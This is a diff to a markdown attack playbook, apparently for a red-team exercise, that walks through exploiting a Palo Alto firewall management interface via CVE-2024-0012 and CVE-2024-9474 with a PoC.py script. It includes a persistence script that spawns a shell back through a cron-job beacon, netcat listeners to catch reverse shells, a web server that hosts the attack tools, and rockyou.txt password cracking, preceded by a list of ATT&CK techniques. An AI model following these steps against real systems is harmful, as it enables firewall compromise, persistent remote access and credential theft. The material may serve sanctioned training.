@@ -8,30 +8,27 @@ Enterprise:
 
 Account Discovery: Domain Account, Archive Collected Data: Archive via Utility, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Windows Command Shell, Compromise Infrastructure: Server, Compromise Infrastructure: Botnet, Credentials from Password Stores, Data from Local System, Data Staged, Local Data Staging, Encrypted Channel: Symmetric Cryptography, Exploit Public-Facing Application, Indicator Removal: File Deletion, Indicator Removal: Clear Network Connection History and Configurations, Lateral Tool Transfer, Log Enumeration, Masquerading: Match Legitimate Name or Location, Masquerading: Masquerade File Type, Obtain Capabilities: Tool, OS Credential Dumping: LSASS Memory, OS Credential Dumping: NTDS, Permission Groups Discovery: Local Groups, Permission Groups Discovery: Domain Groups, Process Discovery, Proxy, Internal Proxy, Query Registry, Remote System Discovery, Server Software Component: Web Shell, Software Discovery, System Information Discovery, System Network Configuration Discovery, System Network Connections Discovery, System Owner/User Discovery, Valid Accounts: Domain Accounts, Virtualization/Sandbox Evasion: System Checks, Windows Management Instrumentation
 
-
-
 Target: Palo Alto firewall management interface at XXX.XXX.XXX.XXX
 Exploit Used: `PoC.py`
 CVE: CVE-2024-0012 and `CVE-2024-9474`
-
 
 ## *REQUIREMENTS*: [ClickPaste](https://github.com/Collective-Software/ClickPaste)
 
 - download from source file
 - to copy and paste information simpler to from your HOST to the VM
- 
+
 ## Phase 0: Initial Setup for Kill Chain
 
 ### Exploit Setup:
 
 1. Create a new folder on your `attack box`
    - This will stage all of the required files and scripts.
-3. Open a text editor (nano) on the attack machine. `sudo nano PoC.py`
-4. Copy PoC.py from your host and paste into VM into the text editor
+2. Open a text editor (nano) on the attack machine. `sudo nano PoC.py`
+3. Copy PoC.py from your host and paste into VM into the text editor
    - best case of doing this is utilizing `ClickPaste`
-6. Press `ctrl+O` and then enter to write out the file, then press `ctrl+S` to save, then press `ctrl+X` to exit the program
-7. `chmod +x PoC.py`
-   
+4. Press `ctrl+O` and then enter to write out the file, then press `ctrl+S` to save, then press `ctrl+X` to exit the program
+5. `chmod +x PoC.py`
+
 ### Persistence Script Setup:
 
 1. Perform the following command: `nano pan_os_comm.py`
@@ -66,12 +63,12 @@ pty.spawn("sh")
 ```
 
 3. Once created, run the following command: `chmod +x pan_os_comm.py`
+
 ### *Host Your Tools Folder On A Web Server*
 
 1. In the folder where you have created your tools, start a web server to host the necessary files for the exploit
    Run the below command to start the web server:
    `python3 -m http.server <port>`
-
 
 ### *Update Your `rockyou.txt` Wordlist For Later Password Cracking*
 
@@ -206,10 +203,10 @@ KG+Vs7e5$dF4
 
 1. Open up your terminal, and if you dont already have 4, go to your terminal preferences and change the settings to start with 4 panes.
 2. In one of the terminal panes, set up your initial lsitener using Netcat to catch the callback shell from the exploit. Be sure to note the port that you are using for this listener, as it will be needed when initiating the exploit.
-   	`nc -lnv <random port>`
+   - `nc -lnv <random port>`
 3. In another terminal pane, set up a second listener to catch the beacon once the cron job is set up on the compromised Palo. Use the port provided in the *pan_os_comm.py* script that was created earlier.
 4. Run the following command to start the second listener:
-	`nc -lnv <port used in script>`
+   - `nc -lnv <port used in script>`
 
 ### Section 2. Execute the PoC Script
 
